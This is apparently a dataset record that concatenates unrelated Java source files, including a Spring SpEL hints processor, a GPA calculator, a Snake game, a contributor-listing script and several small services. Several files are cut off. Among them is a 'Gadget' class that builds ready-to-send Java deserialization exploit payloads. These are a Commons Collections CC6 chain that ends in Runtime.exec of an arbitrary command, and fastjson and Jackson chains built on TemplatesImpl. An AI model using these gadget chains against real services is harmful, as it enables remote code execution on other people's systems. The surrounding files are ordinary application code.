SpelHints implements BeanFactoryInitializationAotProcessor {\n\n\t\tprivate String resolveBeanName(BeanReference br) {\n\t\t\ttry {\n\t\t\t\tvar field = ReflectionUtils\n\t\t\t\t\t\t.findField(BeanReference.class, \"beanName\");\n\t\t\t\tfield.setAccessible(true);\n\t\t\t\treturn (String) field.get(br);\n\t\t\t} catch (IllegalAccessException ex) {\n\t\t\t\tthrow new IllegalStateException(\"Could not resolve beanName for BeanReference [%s]\".formatted(br), ex);\n\t\t\t}\n\t\t}\n\n\t\tprivate void resolveBeanNames(Set<String> beans, SpelNode spelNode) {\n\t\t\tif (spelNode instanceof BeanReference beanReference) {\n\t\t\t\tbeans.add(resolveBeanName(beanReference));\n\t\t\t}\n\t\t\tvar childCount = spelNode.getChildCount();\n\n\t\t\tif (childCount == 0) return;\n\n\t\t\tfor (var i = 0; i < childCount; i++)\n\t\t\t\tresolveBeanNames(beans, spelNode.getChild(i));\n\n\t\t}\n\n\t\t@Override\n\t\tpublic BeanFactoryInitializationAotContribution processAheadOfTime(ConfigurableListableBeanFactory beanFactory) {\n\t\t\tvar sep = new SpelExpressionParser();\n\t\t\tvar rawParse = sep.parseRaw(SPEL).getAST();\n\t\t\tvar beanNames = new HashSet<String>();\n\t\t\tresolveBeanNames(beanNames, rawParse);\n\t\t\treturn (generationContext, beanFactoryInitializationCode) -> {\n\t\t\t\tvar hints = generationContext.getRuntimeHints();\n\t\t\t\tfor (var bean : beanNames) {\n\t\t\t\t\tvar bd = beanFactory.getBeanDefinition(bean);\n\t\t\t\t\tvar clzzName = bd.getBeanClassName();\n\t\t\t\t\tif (StringUtils.hasText(clzzName)) {\n\t\t\t\t\t\thints.reflection().registerType(TypeReference.of(clzzName), MemberCategory.values());\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t};\n\t\t}\n\t}\n\n\n\n\t@Bean\n\tApplicationRunner illPutASpelOnYou(BeanFactory beanFactory) throws Exception {\n\t\treturn args -> {\n\t\t\tvar spel = new SpelExpressionParser();\n\t\t\tvar sec = new StandardEvaluationContext();\n\t\t\tsec.setBeanResolver(new BeanFactoryResolver(beanFactory));\n\t\t\tvar uid = spel.parseExpression(SPEL).getValue(sec, String.class);\n\t\t\tSystem.out.println(\"the UID is \" + uid);\n\n\t\t};\n\t}\n}\n\n@Service\nclass CustomerService {\n\n\tpublic String uid() {\n\t\treturn UUID.randomUUID().toString();\n\t}\n\n}",
    "package com.coffeewithdeveloper.coffeewithdeveloper.Services.Implementation;\n\nimport com.coffeewithdeveloper.coffeewithdeveloper.Entities.User;\nimport com.coffeewithdeveloper.coffeewithdeveloper.Repositories.UserRepository;\nimport com.coffeewithdeveloper.coffeewithdeveloper.Security.CustomUserDetails;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.security.core.userdetails.UserDetails;\nimport org.springframework.security.core.userdetails.UserDetailsService;\nimport org.springframework.security.core.userdetails.UsernameNotFoundException;\nimport org.springframework.stereotype.Component;\n\n\n@Component\npublic class UserDetailsServiceImpl implements UserDetailsService {\n\n    @Autowired\n    private UserRepository userRepository;\n    private static final Logger logger = LoggerFactory.getLogger(UserDetailsServiceImpl.class);\n\n\n    public UserDetailsServiceImpl() {\n        this.userRepository = userRepository;\n    }\n\n    @Override\n    public UserDetails loadUserByUsername(String email) throws UsernameNotFoundException {\n\n        logger.debug(\"Entering in loadUserByUsername Method...\");\n        User user = userRepository.findByEmail(email);\n        if(user == null){\n            logger.error(\"Username not found: \" + email);\n            throw new UsernameNotFoundException(\"could not found user..!!\");\n        }\n        logger.info(\"User Authenticated Successfully..!!!\");\n        return new CustomUserDetails(user);\n    }\n}\n",
    "\r\nimport javax.swing.*;\r\nimport java.awt.*;\r\nimport java.awt.event.ActionEvent;\r\nimport java.awt.event.ActionListener;\r\nimport java.util.ArrayList;\r\nimport java.io.File;\r\nimport java.io.FileWriter;\r\nimport java.io.IOException;\r\nimport java.text.SimpleDateFormat;\r\nimport java.util.Date;\r\n\r\npublic class GPACalculator extends JFrame {\r\n    private JPanel mainPanel,headingpanel,buttonPanel;\r\n    private JTextField nameField, semesterField;\r\n    private JComboBox<Integer> totalCoursesComboBox;\r\n    private JButton calculateButton;\r\n\r\n    private JLabel headinglbl;\r\n    private ArrayList<JTextField>courseNameFields;\r\n    private ArrayList<JComboBox<String>> gradeComboBoxes;\r\n    private ArrayList<JComboBox<Integer>> creditHoursComboBoxes;\r\n    private JPanel coursesPanel;\r\n    private static final String[] GRADES =       {\"A\", \"A-\", \"B+\", \"B\", \"B-\", \"C+\", \"C\", \"C-\", \"D\", \"F\"};\r\n    private static final Double[] GRADE_POINTS = {4.0, 3.66, 3.33, 3.0, 2.66, 2.33, 2.0, 1.66, 1.0, 0.0};\r\n\r\n    public GPACalculator() {\r\n        setTitle(\"GPA Calculator\");\r\n        setSize(500, 600);\r\n        setResizable(false);\r\n        setDefaultCloseOperation(EXIT_ON_CLOSE);\r\n        initUI();\r\n    }\r\n\r\n    private void initUI() {\r\n        mainPanel = new JPanel();\r\n        mainPanel.setLayout(new BoxLayout(mainPanel, BoxLayout.Y_AXIS));\r\n\r\n        JPanel topPanel = new JPanel(new FlowLayout());\r\n        topPanel.setBackground(Color.LIGHT_GRAY);\r\n        getContentPane().setBackground(Color.GREEN);\r\n        nameField = new JTextField(10);\r\n        semesterField = new JTextField(10);\r\n        topPanel.add(new JLabel(\"Name:\"));\r\n        topPanel.add(nameField);\r\n        topPanel.add(new JLabel(\"Semester:\"));\r\n        topPanel.add(semesterField);\r\n\r\n        JPanel courseSelectionPanel = new JPanel(new FlowLayout());\r\n        courseSelectionPanel.setBackground(Color.LIGHT_GRAY);\r\n        totalCoursesComboBox = new JComboBox<>();\r\n        for (int i = 1; i <= 10; i++) {\r\n            totalCoursesComboBox.addItem(i);\r\n        }\r\n        totalCoursesComboBox.setSelectedIndex(4); // Default to 5 courses\r\n        totalCoursesComboBox.addActionListener(e -> updateCoursesPanel((int) totalCoursesComboBox.getSelectedItem()));\r\n        courseSelectionPanel.add(new JLabel(\"Total Courses:\"));\r\n        courseSelectionPanel.add(totalCoursesComboBox);\r\n\r\n        coursesPanel = new JPanel();\r\n        coursesPanel.setLayout(new BoxLayout(coursesPanel, BoxLayout.Y_AXIS));\r\n        coursesPanel.setBackground(Color.darkGray);\r\n        updateCoursesPanel(5); // Initialize with 5 courses\r\n\r\n        headinglbl = new JLabel(\"Welcome to GPA Calculator\");\r\n        headinglbl.setBackground(Color.GRAY);\r\n        headinglbl.setForeground(Color.green);\r\n        headinglbl.setFont(new Font(\"consolas\",Font.BOLD,20));\r\n        calculateButton = new JButton(\"Calculate GPA\");\r\n        calculateButton.setBackground(Color.GREEN);\r\n        calculateButton.setHorizontalAlignment(SwingConstants.CENTER);\r\n        calculateButton.addActionListener(new ActionListener() {\r\n            @Override\r\n            public void actionPerformed(ActionEvent e) {\r\n                calculateGPA();\r\n            }\r\n        });\r\n\r\n        headingpanel = new JPanel();\r\n        headingpanel.setLayout(new FlowLayout(FlowLayout.CENTER,0,5));\r\n        headingpanel.add(headinglbl);\r\n        mainPanel.add(headingpanel);\r\n        buttonPanel= new JPanel();\r\n        buttonPanel.setLayout(new FlowLayout(FlowLayout.CENTER,0,5));\r\n        Dimension buttonSize = new Dimension(150,40);\r\n        calculateButton.setPreferredSize(buttonSize);\r\n        calculateButton.setMaximumSize(buttonSize);\r\n        calculateButton.setMinimumSize(buttonSize);\r\n        buttonPanel.add(calculateButton);\r\n        mainPanel.add(topPanel);\r\n        mainPanel.add(courseSelectionPanel);\r\n        mainPanel.add(new JScrollPane(coursesPanel));\r\n        mainPanel.add(buttonPanel);\r\n//        mainPanel.add(calculateButton);\r\n        add(mainPanel);\r\n    }\r\n\r\n    private void updateCoursesPanel(int totalCourses) {\r\n        coursesPanel.removeAll();\r\n        gradeComboBoxes = new ArrayList<>();\r\n        creditHoursComboBoxes = new ArrayList<>();\r\n        courseNameFields = new ArrayList<>(); \r\n\r\n        for (int i = 0; i < totalCourses; i++) {\r\n            JPanel coursePanel = new JPanel(new FlowLayout());\r\n            coursePanel.setBackground(Color.gray);\r\n            JTextField courseNameField = new JTextField(10);\r\n            JComboBox<Integer> creditHoursComboBox = new JComboBox<>();\r\n            for (int j = 1; j <= 5; j++) {\r\n                creditHoursComboBox.addItem(j);\r\n            }\r\n            JComboBox<String> gradeComboBox = new JComboBox<>(GRADES);\r\n\r\n            creditHoursComboBoxes.add(creditHoursComboBox);\r\n            gradeComboBoxes.add(gradeComboBox);\r\n            courseNameFields.add(courseNameField); // Add to the list\r\n\r\n            coursePanel.add(new JLabel(\"Course \" + (i + 1) + \":\"));\r\n            coursePanel.",
    "///usr/bin/env jbang \"$0\" \"$@\" ; exit $?\n\n//JAVA 21+\n\n//DEPS com.h2database:h2-mvstore:2.2.224\n//DEPS org.eclipse.jgit:org.eclipse.jgit:6.9.0.202403050737-r\n//DEPS org.kohsuke:github-api:1.321\n//DEPS info.picocli:picocli:4.7.5\n//DEPS one.util:streamex:0.8.2\n//DEPS me.tongfei:progressbar:0.10.1\n//DEPS org.eclipse.collections:eclipse-collections:11.1.0\n\n//DEPS org.tinylog:tinylog-api:2.7.0\n//DEPS org.tinylog:tinylog-impl:2.7.0\n//DEPS org.tinylog:slf4j-tinylog:2.7.0 // because of jgit\n//FILES tinylog.properties\n\nimport java.io.IOException;\nimport java.io.Serializable;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.time.Duration;\nimport java.time.Instant;\nimport java.time.format.DateTimeFormatter;\nimport java.util.Comparator;\nimport java.util.HashSet;\nimport java.util.Iterator;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.Optional;\nimport java.util.Set;\nimport java.util.SortedSet;\nimport java.util.TreeSet;\nimport java.util.concurrent.Callable;\nimport java.util.regex.Matcher;\nimport java.util.regex.Pattern;\nimport java.util.stream.Collectors;\n\nimport me.tongfei.progressbar.ProgressBar;\nimport one.util.streamex.StreamEx;\nimport org.eclipse.collections.api.multimap.MutableMultimap;\nimport org.eclipse.collections.impl.factory.Multimaps;\nimport org.tinylog.Logger;\n\nimport org.eclipse.jgit.api.Git;\nimport org.eclipse.jgit.lib.Repository;\nimport org.eclipse.jgit.revwalk.RevCommit;\nimport org.eclipse.jgit.revwalk.RevWalk;\nimport org.h2.mvstore.MVMap;\nimport org.h2.mvstore.MVStore;\nimport org.kohsuke.github.GHPullRequest;\nimport org.kohsuke.github.GHPullRequestCommitDetail;\nimport org.kohsuke.github.GHRepository;\nimport org.kohsuke.github.GHUser;\nimport org.kohsuke.github.GitHub;\nimport org.kohsuke.github.PagedIterator;\nimport org.kohsuke.github.PagedSearchIterable;\n\nimport picocli.CommandLine;\nimport picocli.CommandLine.Command;\nimport picocli.CommandLine.Option;\nimport picocli.CommandLine.Parameters;\n\n@Command(name = \"gcl\",\n        version = \"gcl 0.1.0\",\n        mixinStandardHelpOptions = true,\n        sortSynopsis = false)\npublic class gcl implements Callable<Integer> {\n\n    @Parameters(index = \"0\", description = \"The path to the git repository to analyse.\")\n    private Path repositoryPath;\n\n    @Option(names = \"--startrevision\", description = \"The first revision to check (tag or commit id). Excluded.\")\n    private String startCommitRevStr = \"v5.12\";\n\n    @Option(names = \"--endrevision\", description = \"The last revision to check (tag or commit id). Included.\")\n    private String endCommitRevStr = \"v5.13\";\n\n    @Option(names = \"--owner\", description = \"The GitHub owner of the repository\")\n    private String owner = \"JabRef\";\n\n    @Option(names = \"--repo\", description = \"The GitHub repository name\")\n    private String repository = \"jabref\";\n\n    @Option(names = \"--cols\", description = \"Number of columns\")\n    private Integer cols  = 6;\n\n    @Option(names = \"--filter\")\n    private List<String> ignoredUsers = List.of(\"koppor\", \"calixtus\", \"Siedlerchr\", \"tobiasdiez\", \"but\", \"k3KAW8Pnf7mkmdSMPHz27\", \"HoussemNasri\", \"dependabot[bot]\", \"dependabot\", \"apps/dependabot\", \"apps/githubactions\", \"ThiloteE\");\n\n    @Option(names = \"--filter-emails\")\n    private List<String> ignoredEmails = List.of(\n            \"118344674+github-merge-queue@users.noreply.github.com\", \"github-merge-queue@users.noreply.github.com\", \"gradle-update-robot@regolo.cc\", \"team@moderne.io\", \"49699333+dependabot[bot]@users.noreply.github.com\",\n            \"houssemnasri2001@gmail.com\", \"cc.snethlage@gmail.com\", \"50491877+calixtus@users.noreply.github.com\", \"siedlerkiller@gmail.com\", \"Siedlerchr@users.noreply.github.com\", \"320228+Siedlerchr@users.noreply.github.com\");\n\n    @Option(names = { \"-l\", \"--github-lookup\" }, description = \"Should calls be made to GitHub's API for user information\", negatable = true)\n    boolean ghLookup = true;\n\n    @Option(names = {\"-m\", \"--lgin-mapping\"}, description = {\"Mapping of GitHub logins to names. Format: name=login\"})\n    Map<String, String> loginMapping = Map.of(\"shawn.jj\", \"shawn-jj\",\n            \"Harshit.Gupta7\", \"harsh1898\",\n            \"Ramandeep Singh\", \"rdsingh13\",\n            \"luklehnert\", \"lwlR\",\n            \"Filippa Nilsson\", \"filippanilsson\",\n            \"Houssem Nasri\", \"HoussemNasri\",\n            \"Anish.Pal\", \"pal-anish\");\n\n    private static final String avatarImgWidth = \"117\";\n\n    private static final String githubUsersEmailSuffix = \"@users.noreply.github.com\";\n\n    private record Contributor(String name, String url, String avatarUrl) implements Serializable {\n    }\n\n    private record CoAuthor(String name, String email) {\n        public CoAuthor(String line) {\n            this(line.substring(\"Co-authored-by: \".length(), line.indexOf('<')).trim(),\n                    line.substring(line.indexOf('<') + 1, line.indexOf('>')).trim());\n            Logger.trace(\"Parsed \\\"{}\\\" into {}\", line, this);\n        }\n    }\n\n    private SortedSet<Contributor> contributors = new TreeSet<>((",
    "/*      Remote player waypoints for Xaero's Map\n        Copyright (C) 2024  Leander Kn\u00fcttel\n\n        This program is free software: you can redistribute it and/or modify\n        it under the terms of the GNU General Public License as published by\n        the Free Software Foundation, either version 3 of the License, or\n        (at your option) any later version.\n\n        This program is distributed in the hope that it will be useful,\n        but WITHOUT ANY WARRANTY; without even the implied warranty of\n        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n        GNU General Public License for more details.\n\n        You should have received a copy of the GNU General Public License\n        along with this program.  If not, see <https://www.gnu.org/licenses/>.*/\n\npackage tbc.remote_player_waypoints_for_xaero.MapUpdates;\n\npublic class SquareMapUpdate {\n    public static class Player {\n        public String name;\n        public String world;\n        public int x;\n        public int z;\n    }\n\n    public Player[] players;\n}",
    "import java.awt.*;\nimport java.awt.event.*;\nimport java.time.Duration;\nimport java.time.LocalDateTime;\nimport java.io.FileWriter;\nimport java.io.IOException;\nimport java.util.ArrayList;\nimport java.util.Random;\nimport javax.swing.*;\nimport javax.sound.sampled.*;\nimport java.io.File;\n\n// SnakeGame class\npublic class SnakeGame extends JPanel implements ActionListener, KeyListener {\n    // Tile inner class to represent a single tile in the game board\n    public class Tile {\n        int x; // X coordinate of the tile\n        int y; // Y coordinate of the tile\n\n        // Tile constructor\n        Tile(int x, int y) {\n            this.x = x;\n            this.y = y;\n        }\n    }\n\n\n    // Instance variables to store start and end times\n    private LocalDateTime startTime;\n    private LocalDateTime endTime;\n\n    // Instance variables\n    int boardWidth; // Width of the game board\n    int boardHeight; // Height of the game board\n    int tileSize = 50; // Size of each tile\n\n    // Snake variables\n    Tile snakeHead; // Reference to the snake's head tile\n    ArrayList<Tile> snakeBody; // List to store the snake's body segments\n\n    // Food variables\n    ArrayList<Tile> foodTiles; // List to store food tiles\n    Random random; // Random object for generating random numbers\n\n    // Game logic variables\n    int velocityX; // Horizontal velocity of the snake\n    int velocityY; // Vertical velocity of the snake\n    Timer gameLoop; // Timer for the game loop\n\n    boolean gameOver = true; // Flag to indicate if the game is over\n\n    JButton homeButton; // Button to return to home page\n\n    boolean[][] obstacleGrid; // Grid to track obstacles\n\n    int bestScore = 0; // Best score achieved in the game\n\n    // Sound Clips\n    Clip eatFoodClip; // Sound clip for eating food\n    Clip gameOverClip; // Sound clip for game over\n    Clip collisionClip; // Sound clip for collision\n\n    int movesSinceLastFood; // Counter to track moves since last food consumption\n\n    int selectedFood; // Number of food items to be placed on the screen\n\n    // Color variables for head and body\n    public Color headColor; // Color of the snake's head\n    public Color bodyColor; // Color of the snake's body\n\n    // SnakeGame constructor\n    SnakeGame(int boardWidth, int boardHeight, int selectedFood) {\n        this.boardWidth = boardWidth;\n        this.boardHeight = boardHeight;\n        setPreferredSize(new Dimension(this.boardWidth, this.boardHeight)); // Set preferred size of panel\n        setBackground(Color.black); // Set background color\n        addKeyListener(this); // Add key listener to handle user input\n        setFocusable(true); // Set focusable to true to receive key events\n\n        // Initialize start time\n        recordStartTime();\n        \n        // Initialize obstacle grid\n        obstacleGrid = new boolean[boardWidth / tileSize][boardHeight / tileSize];\n\n        // Initialize snake\n        snakeHead = new Tile(0, 5); // Initialize snake head with provided coordinates\n        snakeBody = new ArrayList<Tile>(); // Initialize snake body\n\n        // Initialize food\n        foodTiles = new ArrayList<>(); // Initialize food tiles list\n        random = new Random(); // Initialize random object\n        placeFood(selectedFood); // Place food on the game board\n\n        // Initialize game logic variables\n        velocityX = 1; // Initial horizontal velocity\n        velocityY = 0; // Initial vertical velocity\n\n        // Initialize game loop timer\n        gameLoop = new Timer(130, this); // Set timer delay\n        gameLoop.start(); // Start the game loop timer\n\n        // Initialize home button\n        homeButton = new JButton(\"Home\");\n        homeButton.addActionListener(new ActionListener() {\n            @Override\n            public void actionPerformed(ActionEvent e) {\n                returnToHomePage();\n            }\n        });\n        add(homeButton);\n\n        // Load sound clips\n        loadSoundClips();\n\n        // Initialize moves counter\n        movesSinceLastFood = 0;\n\n        // Initialize selectedFood\n        this.selectedFood = selectedFood;\n\n        // Initialize head and body colors\n        headColor = new Color(0, 250, 0); // Default head color\n        bodyColor = new Color(0, 150, 0); // Default body color\n    }\n\n        // Method to record the start time of the gameplay\n        private void recordStartTime() {\n            startTime = LocalDateTime.now();\n        }\n    \n        // Method to record the end time of the gameplay\n        private void recordEndTime() {\n            endTime = LocalDateTime.now();\n        }\n    \n        // Method to calculate gameplay duration\n        private Duration calculateGameplayDuration() {\n            return Duration.between(startTime, endTime);\n        }\n    \n        // Method to save gameplay time into a text file\n        private void saveGameplayTime(Duration duration) {\n            try (FileWriter writer = new FileWriter(\"gameplay_time.txt\")) {\n                writer.write(\"Gameplay Time: \" ",
    "package org.util;\n\nimport com.alibaba.fastjson.JSONArray;\nimport com.fasterxml.jackson.databind.node.POJONode;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.keyvalue.TiedMapEntry;\nimport org.apache.commons.collections.map.LazyMap;\n\nimport javax.management.BadAttributeValueExpException;\nimport java.io.ByteArrayOutputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Field;\nimport java.util.HashMap;\nimport java.util.HashSet;\nimport java.util.Map;\n\npublic class Gadget {\n    public static byte[] fastjson49_83(String common) throws Exception {\n        TemplatesImpl template = TemplateUtils.getTemplate(common);\n        JSONArray jsonArray = new JSONArray();\n        jsonArray.add(template);\n\n        BadAttributeValueExpException bd = new BadAttributeValueExpException(null);\n        Field field = bd.getClass().getDeclaredField(\"val\");\n        field.setAccessible(true);\n        field.set(bd, jsonArray);\n\n        HashMap hashMap = new HashMap();\n        hashMap.put(template,bd);\n        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();\n        new ObjectOutputStream(byteArrayOutputStream).writeObject(hashMap);\n        return byteArrayOutputStream.toByteArray();\n    }\n\n    public static byte[] cc6(String common) throws Exception {\n        ChainedTransformer chain = new ChainedTransformer(new Transformer[]{\n                new ConstantTransformer(Runtime.class),\n                new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}),\n                new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),\n                new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{common})\n        });\n        HashMap hashMap = new HashMap();\n        Map decorate = LazyMap.decorate(hashMap, chain);\n        TiedMapEntry tiedMapEntry = new TiedMapEntry(decorate,\"foo\");\n\n        HashSet map = new HashSet(1);\n        map.add(\"foo\");\n        Field f = null;\n        f = HashSet.class.getDeclaredField(\"map\");\n        f.setAccessible(true);\n        HashMap innimpl = (HashMap) f.get(map);\n\n        Field f2 = HashMap.class.getDeclaredField(\"table\");\n        f2.setAccessible(true);\n        Object[] array = (Object[]) f2.get(innimpl);\n\n        Object node = array[0];\n        if(node == null){\n            node = array[1];\n        }\n\n        Field keyField = null;\n        keyField = node.getClass().getDeclaredField(\"key\");\n        keyField.setAccessible(true);\n        keyField.set(node, tiedMapEntry);\n\n        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();\n        new ObjectOutputStream(byteArrayOutputStream).writeObject(map);\n        return byteArrayOutputStream.toByteArray();\n    }\n\n    public static byte[] jackson(String common) throws Exception {\n        TemplatesImpl template = TemplateUtils.getTemplate(common);\n        POJONode node = new POJONode(template);\n        BadAttributeValueExpException val = new BadAttributeValueExpException(null);\n        //\u53cd\u5c04\u8bbe\u7f6eval\u5c5e\u6027\n        Field val1 = val.getClass().getDeclaredField(\"val\");\n        val1.setAccessible(true);\n        val1.set(val,node);\n\n        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();\n        new ObjectOutputStream(byteArrayOutputStream).writeObject(val);\n        return byteArrayOutputStream.toByteArray();\n    }\n}\n",
    "package app.entities;\n\n\nimport app.dtos.EventDTO;\nimport com.fasterxml.jackson.annotation.JsonManagedReference;\nimport jakarta.persistence.*;\nimport lombok.*;\n\nimport java.time.LocalDate;\nimport java.time.LocalDateTime; \nimport java.util.HashSet;\nimport java.util.Set;\n\n\n@ToString\n@Getter\n@Setter\n@NoArgsConstructor\n@Entity\n@AllArgsConstructor\npublic class Event {\n\n    @Id\n    @GeneratedValue (strategy = GenerationType.IDENTITY)\n    private int id;\n    private String title;\n\n    private String startTime;\n\n    private String description;\n\n    private LocalDate dateOfEvent;\n\n    private int durationInHours;\n\n    private int maxNumberOfStudents;\n\n    private String locationOfEvent;\n\n    private String instructor;\n\n\n    private double price;\n\n    private String category;\n\n    private String image;\n\n\n    private Status status;\n\n\n    private LocalDateTime createdAt;\n\n\n    private LocalDateTime updatedAt;\n\n    private LocalDateTime canceledAt;\n\n    @ManyToMany(fetch = FetchType.EAGER)\n    @ToString.Exclude\n    @JsonManagedReference\n    private Set<User> users = new HashSet<>();\n\n\n    public Event(String title, String startTime, String description, LocalDate dateOfEvent, int durationInHours, int maxNumberOfStudents, String locationOfEvent, String instructor, double price, String category, String image, Status status) {\n        this.title = title;\n        this.startTime = startTime;\n        this.description = description;\n        this.dateOfEvent = dateOfEvent;\n        this.durationInHours = durationInHours;\n        this.maxNumberOfStudents = maxNumberOfStudents;\n        this.locationOfEvent = locationOfEvent;\n        this.instructor = instructor;\n        this.price = price;\n        this.category = category;\n        this.image = image;\n        this.status = status;\n    }\n\n    public Event (EventDTO eventDTO){\n        this.title = eventDTO.getTitle();\n        this.startTime = eventDTO.getStartTime();\n        this.description = eventDTO.getDescription();\n\n        LocalDate dateOfEventFromDTO = LocalDate.parse(eventDTO.getDateOfEvent());\n        this.dateOfEvent = dateOfEventFromDTO;\n\n        this.durationInHours = eventDTO.getDurationInHours();\n        this.maxNumberOfStudents = eventDTO.getMaxNumberOfStudents();\n        this.locationOfEvent = eventDTO.getLocationOfEvent();\n        this.instructor = eventDTO.getInstructor();\n        this.price = eventDTO.getPrice();\n        this.category = eventDTO.getCategory();\n        this.image = eventDTO.getImage();\n\n        this.status = eventDTO.getStatus();\n    }\n\n    @PrePersist\n    private void eventCreatedAt() throws RuntimeException{\n        LocalDateTime localDateTime = LocalDateTime.now();\n        this.createdAt = localDateTime;\n\n    }\n\n    @PreUpdate\n    private void eventUpdatedAt() throws RuntimeException{\n        LocalDateTime localDateTime = LocalDateTime.now();\n        this.updatedAt = localDateTime;\n\n        // TODO: Be sure that this works\n        if(status.toString().equalsIgnoreCase(\"canceled\")){\n            this.canceledAt = localDateTime;\n        }\n    }\n\n    public void removeUser(User user) {\n        if(user != null){\n            users.remove(user);\n            if(user.getEvents().contains(this)){\n                user.removeEvent(this);\n            }\n        }\n    }\n\n    public void addUser(User user) {\n        if (user !=null){\n            users.add(user);\n            if(!user.getEvents().contains(this)){\n                user.addEvent(this);\n            }\n        }\n    }\n}\n",
    "package com.example.demo.services;\n\nimport java.util.ArrayList;\nimport java.util.Optional;\n\nimport com.example.demo.models.UsuarioModel;\nimport com.example.demo.repositories.UsuarioRepository;\n\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.stereotype.Service;\n\n@Service\npublic class UsuarioService {\n    @Autowired\n    UsuarioRepository usuarioRepository;\n    \n    public ArrayList<UsuarioModel> obtenerUsuarios(){\n        return (ArrayList<UsuarioModel>) usuarioRepository.findAll();\n    }\n\n    public UsuarioModel guardarUsuario(UsuarioModel usuario){\n        return usuarioRepository.save(usuario);\n    }\n\n    public Optional<UsuarioModel> obtenerPorId(Long id){\n        return usuarioRepository.findById(id);\n    }\n\n\n    public ArrayList<UsuarioModel>  obtenerPorPrioridad(Integer prioridad) {\n        return usuarioRepository.findByPrioridad(prioridad);\n    }\n\n    public boolean eliminarUsuario(Long id) {\n        try{\n            usuarioRepository.deleteById(id);\n            return true;\n        }catch(Exception err){\n            return false;\n        }\n    }\n\n\n    \n}",
    "package com.example.memorand;\n\nimport androidx.annotation.NonNull;\nimport androidx.appcompat.app.AppCompatActivity;\nimport androidx.fragment.app.Fragment;\nimport androidx.fragment.app.FragmentTransaction;\n\nimport android.os.Bundle;\nimport android.view.MenuItem;\n\nimport com.google.android.material.bottomnavigation.BottomNavigationView;\n\npublic class MainActivity extends AppCompatActivity {\n\n    FirstFragment firstFragment = new FirstFragment();\n    SecondFragment secondFragment = new SecondFragment();\n    ThirdFragment thirdFragment = new ThirdFragment();\n\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n\n        BottomNavigationView navigation = findViewById(R.id.bnavigation);\n        navigation.setOnNavigationItemSelectedListener(mOnNavigationItemSelectedListener);\n\n        loadFragment(firstFragment);\n    }\n\n    private final BottomNavigationView.OnNavigationItemSelectedListener mOnNavigationItemSelectedListener = new BottomNavigationView.OnNavigationItemSelectedListener() {\n        @Override\n        public boolean onNavigationItemSelected(@NonNull MenuItem item) {\n            int itemId = item.getItemId();\n            if (itemId == R.id.firstFragment) {\n                loadFragment(firstFragment);\n                return true;\n            } else if (itemId == R.id.secondFragment) {\n                loadFragment(secondFragment);\n                return true;\n            } else if (itemId == R.id.thirdFragment) {\n                loadFragment(thirdFragment);\n                return true;\n            }\n            return false;\n        }\n    };\n\n    public void loadFragment(Fragment fragment){\n        FragmentTransaction transaction = getSupportFragmentManager().beginTransaction();\n        transaction.replace(R.id.fcontainer, fragment);\n        transaction.commit();\n    }\n\n}",
    "package application;\n\nimport java.io.BufferedReader;\nimport java.io.FileReader;\nimport java.io.IOException;\nimport java.util.ArrayList;\nimport java.util.Comparator;\nimport java.util.List;\nimport java.util.Locale;\nimport java.util.Scanner;\nimport java.util.stream.Collectors;\n\nimport entities.Product;\n\npublic class Program {\n\n\tpublic static void main(String[] args) {\n\t\t\n\t\tLocale.setDefault(Locale.US);\n\t\tScanner sc = new Scanner(System.in);\n\t\t\n\t\tSystem.out.print(\"Enter full file path: \");\n\t\tString path = sc.nextLine();\n\t\t\n\t\ttry(BufferedReader br = new BufferedReader(new FileReader(path))){\n\t\t\t\n\t\t\tList<Product> list = new ArrayList<>();\n\t\t\t\n\t\t\tString line = br.readLine();\n\t\t\twhile(line != null) {\n\t\t\t\tString[] fields = line.split(\",\");\n\t\t\t\tlist.add(new Product(fields[0], Double.parseDouble(fields[1])));\n\t\t\t\tline = br.readLine();\n\t\t\t}\n\t\t\t\n\t\t\tdouble avg = list.stream()\n\t\t\t\t\t.map(p -> p.getPrice())\n\t\t\t\t\t.reduce(0.0, (x,y) -> x + y) / list.size();\n\t\t\tSystem.out.println(\"Average price: \" + String.format(\"%.2f\", avg));\n\t\t\t\n\t\t\tComparator<String> comp = (s1, s2) -> s1.toUpperCase().compareTo(s2.toUpperCase());\n\t\t\t\n\t\t\tList<String> names = list.stream()\n\t\t\t\t\t.filter(p -> p.getPrice() < avg)\n\t\t\t\t\t.map(p -> p.getName())\n\t\t\t\t\t.sorted(comp.reversed())\n\t\t\t\t\t.collect(Collectors.toList());\n\t\t\t\n\t\t\tnames.forEach(System.out::println);\n\t\t\t\n\t\t} catch (IOException e) {\n\t\t\tSystem.out.println(\"Error: \" + e.getMessage());\n\t\t}\n\t\t\n\t\tsc.close();\n\t}\n\n}\n",
